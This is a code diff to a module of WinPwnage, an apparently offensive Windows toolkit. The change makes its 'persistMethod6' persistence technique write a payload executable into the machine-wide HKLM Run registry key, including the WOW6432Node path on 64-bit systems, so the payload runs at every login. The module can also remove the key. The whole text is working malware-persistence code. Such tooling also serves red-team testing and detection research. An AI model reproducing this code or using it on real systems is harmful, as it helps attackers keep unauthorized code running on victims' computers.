+++ winpwnage/functions/persist/persistMethod6.py
@@ -2,21 +2,30 @@ from winpwnage.core.prints import *
 from winpwnage.core.utils import *
 
 persistMethod6_info = {
-	"Description": "Persistence using HKCU run key",
-	"Method": "Registry key (HKCU Run) manipulation",
+	"Description": "Persistence using HKLM run key",
+	"Method": "Registry key (HKLM Run) manipulation",
 	"Id": "6",
 	"Type": "Persistence",
-	"Fixed In": "99999",
+	"Fixed In": "99999" if information().admin() == True else "0",
 	"Works From": "7600",
-	"Admin": False,
+	"Admin": True,
 	"Function Name": "persistMethod6",
 	"Function Payload": True,
 }
 
 def persistMethod6(payload, name="", add=True):
+	if not information().admin():
+		print_error("Cannot proceed, we are not elevated")
+		return False
+
+	if "64" in information().architecture():
+		kpath = "Software\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\Run"
+	else:
+		kpath = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
+
 	if add:
 		if payloads().exe(payload):
-			if registry().modify_key(hkey="hkcu", path="Software\\Microsoft\\Windows\\CurrentVersion\\Run", name=name, value=payloads().exe(payload)[1]):
+			if registry().modify_key(hkey="hklm", path=kpath, name=name, value=payloads().exe(payload)[1]):
 				print_success("Successfully created {name} key containing payload ({payload})".format(name=name, payload=payloads().exe(payload)[1]))
 				print_success("Successfully installed persistence, payload will run at login")
 			else:
@@ -26,7 +35,7 @@ def persistMethod6(payload, name="", add=True):
 			print_error("Cannot proceed, invalid payload")
 			return False
 	else:
-		if registry().remove_key(hkey="hkcu", path="Software\\Microsoft\\Windows\\CurrentVersion\\Run", name=name):
+		if registry().remove_key(hkey="hklm", path=kpath, name=name):
 			print_success("Successfully removed persistence")
 		else:
 			print_error("Unable to remove persistence")
